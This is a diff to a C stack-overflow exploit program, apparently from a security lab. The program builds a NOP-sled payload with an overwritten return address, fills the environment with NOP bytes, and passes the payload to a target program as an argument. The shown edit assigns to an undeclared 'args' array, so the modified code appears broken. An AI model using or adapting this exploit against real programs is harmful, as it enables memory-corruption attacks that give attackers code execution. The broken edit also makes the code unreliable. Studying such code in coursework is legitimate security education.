@@ -13,7 +13,7 @@ const char NOP_CHAR = 0x90;
 const int RET_OFFSET = 4;
 const uint32_t A1 = BASE_ADDR + RET_OFFSET;
 const uint32_t A2 = BASE_ADDR + 2 * RET_OFFSET;
-const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const char buf[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
 void prepEnv(char *e) {
     memset(e, NOP_CHAR, ENV_SIZE - 1);
@@ -24,7 +24,10 @@ void prepEnv(char *e) {
 }
 
 int main(void) {
-    char *args[] = {TARGET, PADDING, NULL};
+    args[0] = TARGET;
+    args[1] = buf;
+    args[2] = NULL;
+
     char env[ENV_SIZE];
 
     prepEnv(env);
